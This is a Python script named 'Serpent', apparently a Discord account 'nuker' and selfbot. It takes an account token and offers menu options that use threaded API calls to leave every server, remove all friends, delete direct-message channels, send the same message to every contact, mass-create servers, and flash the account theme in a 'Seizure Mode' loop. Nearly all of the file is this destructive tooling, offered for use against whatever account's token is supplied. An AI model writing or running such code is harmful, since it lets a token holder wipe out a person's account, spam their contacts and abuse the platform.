import requests, httpx, threading, os, sys, time, asyncio
from discord.ext import commands
from random import randint

# Misc

session = httpx.Client()
valid = [200, 201, 204]
rl = [429]
clear = lambda: os.system('cls') if sys.platform.startswith("win") else os.system("clear")

webhooks = []

# Token Check

clear()

os.system('cls & mode 80, 20 & title Serpent - Login : Token')

token = input(f"Token: ")
is_user = True if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code in valid else False
header = {"Authorization": token} if is_user is True else {"Authorization": f"Bot {token}"}
headers = header
clear()

client = commands.Bot(command_prefix="Serpent!", self_bot=is_user)

r = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
myname = r['username']
mydisc = r['discriminator']
mytag = f"{myname}#{mydisc}"

class Serpent:
    def SerpentLeaveGuilds(guild):
        print("NOTE: This Only Leaves All Servers...If Their Owner It Won't Delete it..!")
        guildid = guild['id']
        guildname = guild['name']
        LeaveGuildReq = session.delete(f"https://discord.com/api/v9/users/@me/guilds/{guildid}", headers=headers)
        if LeaveGuildReq.status_code in valid:
            print(f"Left Guild {guildname}")
            
    def SerpentDelFriends(friend):
        friendusername = friend['user']['username']
        frienddisc = friend['user']['discriminator']
        friendid = friend['id']
        friendtag = f"{friendusername}#{frienddisc}"
        DelFriend = session.delete(f"https://discord.com/api/v9/users/@me/relationships/{friendid}", headers=headers)
        if DelFriend.status_code in valid:
            print(f"Removed {friendtag} As A Friend")
        print(f"Couldn't Remove {friendtag} As A Friend")
     
    def SerpentDestroyDMS(dm):
        for user in dm['recipients']:
            DestroyReq = session.delete(f"https://discord.com/api/v9/channels/{dm['id']}", headers=headers)
            name = user['username']
            disc = user['discriminator']
            tag = f"{name}#{disc}"
            if DestroyReq.status_code in valid:
                print(f"Deleted DM {tag}")
            else:
                print(F"Couldn't Delete DM: {tag}")
                
    def SerpentMassDM(dm, msg):
        json = { "content": msg, "tts": False}
        for user in dm['recipients']:
            DMReq = session.post(f"https://discord.com/api/v9/channels/{dm['id']}/messages", headers=headers, json=json)
            name = user['username']
            disc = user['discriminator']
            tag = f"{name}#{disc}"
            if DMReq.status_code in valid:
                print(f"DMed: {tag} Message: {msg}")
            else:
                print(f"Couldn't DM: {tag}")
                
    def SerpentCreateServers(name):
        json = {"channels": None, "icon": None, "name": name}
        s = session.post(f"https://discord.com/api/v9/guilds", headers=headers, json=json)
        if s.status_code in valid:
            print(f"Created Guild {name}")
        else:
            print(f"Couldn't Create Guild {name}")
            
    async def SerpentSeizure():
        api = "https://discord.com/api/v9/users/@me/settings"
        json1 = { "theme": "light" }
        json2 = { "theme": "dark" }
        i = 1
        try:
            while True:
                if i == 1:
                    changer = session.patch(api, headers=headers, json=json1)
                    if changer.status_code in valid:
                        print(f"Changed To Light Theme..")
                        i += 1
                    else:
                        print(f"Couldn't Change To Light Theme..! {changer.status_code}")
                        time.sleep(0.73)
                elif i == 2:
                    changer = session.patch(api, headers=headers, json=json2)
                    if changer.status_code in valid:
                        print(f"Changed To Dark Theme..")
                        i -= 1
                        time.sleep(0.73)
                    else:
                        print(f"Couldn't Change To Dark Theme..!")
        except KeyboardInterrupt:
            await SerpentMenu()
                    
async def SerpentMenu():
    os.system(f"cls & mode 80, 20 & title Logged In: {mytag} ~ Awaiting Your Choice")  
    print(f"""
            ███████╗███████╗██████╗ ██████╗ ███████╗███╗   ██╗████████╗
            ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝████╗  ██║╚══██╔══╝
            ███████╗█████╗  ██████╔╝██████╔╝█████╗  ██╔██╗ ██║   ██║   
            ╚════██║██╔══╝  ██╔══██╗██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   
            ███████║███████╗██║  ██║██║     ███████╗██║ ╚████║   ██║   
            ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   
                                                   
                  1 - Leave Guilds   ~   2 - Remove Friends        
                  3 - Delete DMS     ~   4 - Mass DM
                  5 - Create Guilds  ~   6 - Seizure Mode
    """)
    choice = input("> ")
    if choice == "1":
        os.system(f"cls & mode 80, 20 & title Logged In: {mytag} ~ Leaving Guilds")
        [threading.Thread(target=Serpent.SerpentLeaveGuilds, args=(guild,)).start() for guild in requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()]
        time.sleep(2)
        await SerpentMenu()
    elif choice == "2":
        os.system(f"cls & mode 80, 20 & title Logged In: {mytag} ~ Deleting Friends")
        [threading.Thread(target=Serpent.SerpentDelFriends, args=(friend,)).start() for friend in requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()]
        time.sleep(2)
        await SerpentMenu()
    elif choice == "3":
        os.system(f"cls & mode 80, 20 & title Logged In: {mytag} ~ Deleting DMS")
        [threading.Thread(target=Serpent.SerpentDestroyDMS, args=(dm,)).start() for dm in requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()]
        time.sleep(2)
        await SerpentMenu()
    elif choice == "4":
        os.system(f"cls & mode 80, 20 & title Logged In: {mytag} ~ DMing Friends")
        msg = input("Message: ")
        [threading.Thread(target=Serpent.SerpentMassDM, args=(dm,msg,)).start() for dm in requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()]
        time.sleep(2)
        await SerpentMenu()
    elif choice == "5":
        os.system(f"cls & mode 80, 20 & title Logged In: {mytag} ~ Creating Guilds")   
        amount = int(input("How Many Servers? "))
        name = input("Server Names: ")
        [threading.Thread(target=Serpent.SerpentCreateServers, args=(name,)).start() for i in range(amount)]
        time.sleep(2)
        await SerpentMenu()
    elif choice== "6":
        await Serpent.SerpentSeizure()
        
        
if __name__ == "__main__":
    asyncio.run(SerpentMenu())